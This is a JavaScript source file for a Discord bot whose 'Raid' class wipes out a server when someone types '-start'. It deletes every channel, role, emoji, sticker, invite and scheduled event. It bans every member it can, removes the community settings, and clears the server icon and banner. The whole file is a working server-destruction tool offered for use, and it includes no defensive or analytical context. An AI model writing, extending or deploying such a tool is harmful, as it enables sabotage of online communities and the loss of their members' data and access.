const { Client, GatewayIntentBits } = require('discord.js');
const { ChannelType } = require('discord-api-types/v10');

class Raid {
  constructor(guild, client) {
    this.guild = guild;
    this.client = client;
  }

  nukeEmojis() {
    this.guild.emojis.cache.forEach(async (e) => {
      try {
        await e.delete();
      } catch (err) {
        console.log(err.message);
      }
    });
  }

  nukeStickers() {
    this.guild.stickers.cache.forEach(async (e) => {
      try {
        await e.delete();
      } catch (err) {
        console.log(err.message);
      }
    });
  }

  nukeScheduledEvents() {
    this.guild.scheduledEvents.cache.forEach(async (e) => {
      try {
        await e.delete();
      } catch (err) {
        console.log(err.message);
      }
    });
  }

  nukeChannels() {
    this.guild.channels.cache.forEach(async (e) => {
      try {
        await e.delete();
      } catch (err) {
        console.log(err.message);
      }
    });
  }

  nukeRoles() {
    this.guild.roles.cache.forEach(async (e) => {
      try {
        await e.delete();
      } catch (err) {
        console.log(err.message);
      }
    });
  }

  banAllMembers() {
    this.guild.members.cache.forEach(async (e) => {
      if (e.user.id === this.client.user.id || !e.bannable) return;
      try {
        await e.ban();
      } catch (err) {
        console.log(err.message);
      }
    });
  }

  nukeInvites() {
    this.guild.invites.cache.forEach(async (e) => {
      try {
        await e.delete();
      } catch (err) {
        console.log(err.message);
      }
    });
  }

  disableCommunity() {
    this.guild.edit({
      rulesChannel: null,
      safetyAlertsChannel: null,
      publicUpdatesChannel: null,
      description: null,
      features: ['']
    });
  }
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

client.on('ready', async () => {
  console.log(`Logged in as ${client.user.tag}`);
  await client.guilds.fetch();
});

client.on('messageCreate', async (message) => {
  if (message.content.trim() === '-start') {
    const guild = await client.guilds.fetch(message.guild.id);
    const raid = new Raid(guild, client);
    raid.disableCommunity();
    raid.nukeEmojis();
    raid.nukeStickers();
    raid.nukeScheduledEvents();
    raid.nukeChannels();
    raid.nukeRoles();
    raid.banAllMembers();
    raid.nukeInvites();

    try {
      await guild.setIcon(null);
      await guild.setBanner(null);
      await guild.setDiscoverySplash(null);
      await guild.setWidgetSettings({ enabled: false });
      await guild.setDefaultMessageNotifications(0);
    } catch (err) {
      console.log(err.message);
    }
  }
});

client.on('warn', console.log);
client.on('error', console.log);
client.on('debug', console.log);

client.login('YOUR BOT TOKEN');
